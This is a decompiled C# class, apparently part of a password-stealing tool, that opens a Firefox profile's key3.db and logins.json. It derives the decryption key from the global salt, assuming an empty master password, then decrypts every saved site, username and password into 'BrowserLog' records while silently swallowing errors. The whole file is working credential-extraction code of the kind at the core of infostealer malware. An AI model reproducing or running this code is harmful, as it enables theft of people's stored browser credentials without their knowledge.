// Decompiled with JetBrains decompiler
// Type: Decrypt.FireFox
// Assembly: Decrypt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2765FEAE-7833-475D-8D48-4374EDF0542D
// Assembly location: C:\Users\foxov\Desktop\build\bin\Debug\Decrypt.dll

using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace Decrypt
{
  public class FireFox : IPasswordDecrypter
  {
    private string Profile;
    private string Key3Db;
    private string LoginJson;

    public FireFox(string profilePath)
    {
      if (!Directory.Exists(profilePath))
        throw new ArgumentException(string.Format("Folder \"{0}\" not exists", (object) profilePath));
      this.Profile = profilePath;
      if (!File.Exists(Path.Combine(profilePath, "key3.db")))
        throw new ArgumentException("key3.db not exists in this folder");
      this.Key3Db = Path.Combine(profilePath, "key3.db");
      if (!File.Exists(Path.Combine(profilePath, "logins.json")))
        throw new ArgumentException("key3.db not exists in this folder");
      this.LoginJson = Path.Combine(profilePath, "logins.json");
    }

    public List<BrowserLog> GetPasswords()
    {
      try
      {
        List<BrowserLog> browserLogList = new List<BrowserLog>();
        DataTable dataTable = new DataTable();
        Asn1Der asn1Der = new Asn1Der();
        BerkeleyDB berkeleyDb = new BerkeleyDB(this.Key3Db);
        PasswordCheck passwordCheck = new PasswordCheck(berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (p => p.Key.Equals("password-check"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (p => p.Value)).FirstOrDefault<string>().Replace("-", string.Empty));
        string hexString1 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (p => p.Key.Equals("global-salt"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (p => p.Value)).FirstOrDefault<string>().Replace("-", string.Empty);
        MozillaPBE mozillaPbe1 = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString1), Encoding.ASCII.GetBytes(string.Empty), ByteHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
        mozillaPbe1.Compute();
        TripleDESHelper.DESCBCDecryptor(mozillaPbe1.Key, mozillaPbe1.IV, ByteHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
        string hexString2 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>) (p =>
        {
          if (!p.Key.Equals("global-salt") && !p.Key.Equals("Version"))
            return !p.Key.Equals("password-check");
          return false;
        })).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>) (p => p.Value)).FirstOrDefault<string>().Replace("-", "");
        Asn1DerObject asn1DerObject1 = asn1Der.Parse(ByteHelper.ConvertHexStringToByteArray(hexString2));
        MozillaPBE mozillaPbe2 = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString1), Encoding.ASCII.GetBytes(string.Empty), asn1DerObject1.objects[0].objects[0].objects[1].objects[0].Data);
        mozillaPbe2.Compute();
        byte[] dataToParse = TripleDESHelper.DESCBCDecryptorByte(mozillaPbe2.Key, mozillaPbe2.IV, asn1DerObject1.objects[0].objects[1].Data);
        Asn1DerObject asn1DerObject2 = asn1Der.Parse(dataToParse);
        Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.objects[0].objects[2].Data);
        byte[] key = new byte[24];
        if (asn1DerObject3.objects[0].objects[3].Data.Length > 24)
          Array.Copy((Array) asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.Length - 24, (Array) key, 0, 24);
        else
          key = asn1DerObject3.objects[0].objects[3].Data;
        foreach (Login login in File.ReadAllText(this.LoginJson).ParseJSON<RootObject>().logins)
        {
          Asn1DerObject asn1DerObject4 = asn1Der.Parse(Convert.FromBase64String(login.encryptedUsername));
          Asn1DerObject asn1DerObject5 = asn1Der.Parse(Convert.FromBase64String(login.encryptedPassword));
          string str1 = Regex.Replace(TripleDESHelper.DESCBCDecryptor(key, asn1DerObject4.objects[0].objects[1].objects[1].Data, asn1DerObject4.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", string.Empty);
          string str2 = Regex.Replace(TripleDESHelper.DESCBCDecryptor(key, asn1DerObject5.objects[0].objects[1].objects[1].Data, asn1DerObject5.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", string.Empty);
          BrowserLog browserLog = new BrowserLog()
          {
            Host = string.IsNullOrWhiteSpace(login.hostname) ? "UNKOWN" : login.hostname,
            Login = string.IsNullOrWhiteSpace(str1) ? "UNKOWN" : str1,
            Password = string.IsNullOrWhiteSpace(str2) ? "UNKOWN" : str2
          };
          if (browserLog.Login != "UNKOWN" && browserLog.Password != "UNKOWN" && browserLog.Host != "UNKOWN")
            browserLogList.Add(browserLog);
        }
        return browserLogList;
      }
      catch
      {
        return new List<BrowserLog>();
      }
    }
  }
}
